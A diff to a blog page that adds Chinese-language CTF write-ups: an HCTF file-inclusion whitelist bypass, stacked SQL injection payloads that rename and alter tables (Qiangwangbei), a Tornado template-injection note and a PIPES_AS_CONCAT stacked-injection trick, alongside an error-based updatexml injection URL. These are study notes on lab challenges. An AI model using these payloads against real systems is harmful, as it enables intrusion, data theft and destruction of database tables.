@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2018-10-15</span>
-            <span class="time">21:07:06</span>
+            <span class="time">08:10:13</span>
           </span>
           
           <!--  Categories  -->
@@ -150,6 +150,35 @@
 http://<span class="hljs-number">172.21</span><span class="hljs-number">.4</span><span class="hljs-number">.12</span>:<span class="hljs-number">10012</span>/search.php?name=admin%df%<span class="hljs-number">27</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">1</span>, (seSELECTlect group_concat(table_name) from information_schema.tables whWHEREere table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>) <span class="hljs-comment">--+&amp;pw=y1ng</span>
 # Error: XPATH syntax <span class="hljs-built_in">error</span>: <span class="hljs-string">'f14g,user'</span></code></pre>
 
+<h1 id="HCTF"><a href="#HCTF" class="headerlink" title="HCTF"></a>HCTF</h1><pre><code class="hljs undefined"><span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>);
+            <span class="hljs-variable">$_page</span> = mb_substr(
+                <span class="hljs-variable">$_page</span>,
+                0,
+                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)
+            );
+            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
+                <span class="hljs-built_in">return</span> <span class="hljs-literal">true</span>;
+            &#125;
+            <span class="hljs-built_in">echo</span> <span class="hljs-string">"you can't see it"</span>;
+            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;</code></pre>
+
+<pre><code class="hljs undefined">这道题是一道代码审计题，也是个文件包含题，目的是绕过函数从而执行后面的文件
+传入 file=<span class="hljs-built_in">hint</span>.php ，在第一个 in_array 处会返回 <span class="hljs-literal">true</span>，然后直接包含 <span class="hljs-built_in">hint</span>.php
+传入 file=<span class="hljs-built_in">hint</span>.php?/../cookie.txt ，在第二个 in_array 处会返回<span class="hljs-literal">true</span>，第二个 in_array
+中的 <span class="hljs-variable">_page</span> 为 <span class="hljs-built_in">hint</span>.php ，然后包含 <span class="hljs-built_in">hint</span>.php?/../cookie.txt ，但是这里的?
+起到传递参数的作用而不是破坏路径.传入 file=<span class="hljs-built_in">hint</span>.php%<span class="hljs-number">253</span>f/../cookie.txt ，在第三个 in_array 处会返回 <span class="hljs-literal">true</span> ，第三个 
+in_array 中的 <span class="hljs-variable">_page</span> 为 <span class="hljs-built_in">hint</span>.php ，然后包含 <span class="hljs-built_in">hint</span>.php%<span class="hljs-number">3</span>f/../cookie.txt ，这里的 %<span class="hljs-number">3</span>f 即 
+? ，破坏了路径，前面部分的路径不存在，可以包含后面的文件.这个看到file一定要想到文件包含 想办法</code></pre>
+
+<h1 id="强网杯-随便注"><a href="#强网杯-随便注" class="headerlink" title="强网杯 随便注"></a>强网杯 随便注</h1><p>又是涨知识的一道题，这道题用了堆叠注入,就是分开查询,因为这道题都过滤了<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>所以就想到堆叠注入<br><code>1&#39;;show databases;#</code><br><code>1&#39;;show tables;#</code><br><code>1&#39;;show columns from xxxxx;#</code><br>因为这里有两张表，回显内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢<br>我们首先要把第一个表名改成其他的,把有flag的表名改成默认的查询的表这里也就是word表,在把flag换成id或者data因为不知道后台代码 where id=’xxxx’或data=’xxxx’<br>MySQL中反引号和单引号的区别与用法<br>    MySql 中用一对反引号来标注 SQL 语句中的标识，如数据库名、表名、字段名等<br>    引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即字段值<br>    例如：select * from <code>username</code> where <code>name</code>=”peri0d”<br>    MySQL 的 show、rename 和 alter 命令<br>    show 可以用于查看当前数据库，当前表，以及表中的字段<br>    rename 用于修改 table 的名称<br>    alter 用于修改表中字段的属性<br>攻击思路：默认查询 words 表，可以将数字表的名称改成 words，这样就可以 使用 or ‘1’=’1 直接查询 flag 了<br>payloads</p>
+<pre><code class="hljs undefined">?inject=1';<span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`words`</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">`words1`</span>;<span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">`words`</span>;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`words`</span> <span class="hljs-keyword">CHANGE</span> <span class="hljs-string">`flag`</span> <span class="hljs-string">`id`</span> <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> words;%23</code></pre>
+
+<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>这道题是服务器模版注入攻击<br>然而我们是怎么判断的呢,因为参数后面的内容就是回显的内容,再加一点他是render渲染的就更加明确了这一点<br><code>$temp-&gt;render(&quot;Hello &quot;.$_GET[&#39;username&#39;]);</code><br>通过查阅在handler指向的处理当前这个页面的RequestHandler对象，<br>RequestHandler.settings指向self.application.settings，<br>因此handler.settings指向RequestHandler.application.settings。</p>
+<h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy sql"></a>easy sql</h1><p>利用mysqli_multi_query()函数就支持多条sql语句同时执行,所以看到这个就要用堆叠注入<br>源码</p>
+<pre><code class="hljs undefined">$sql = <span class="hljs-string">"select "</span>.$post[<span class="hljs-string">'query'</span>].<span class="hljs-string">"||flag from Flag"</span><span class="hljs-comment">;</span>
+        mysqli_multi_query($MysqlLink,$sql)<span class="hljs-comment">;</span></code></pre>
+
+<p>我们可以通过<br><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code><br>使得||变成&amp;&amp;,就可以查询<br>非预期解<br>*，1<br><code>变成了select *,1||flag from Flag</code></p>
 
         </div>
       </div>
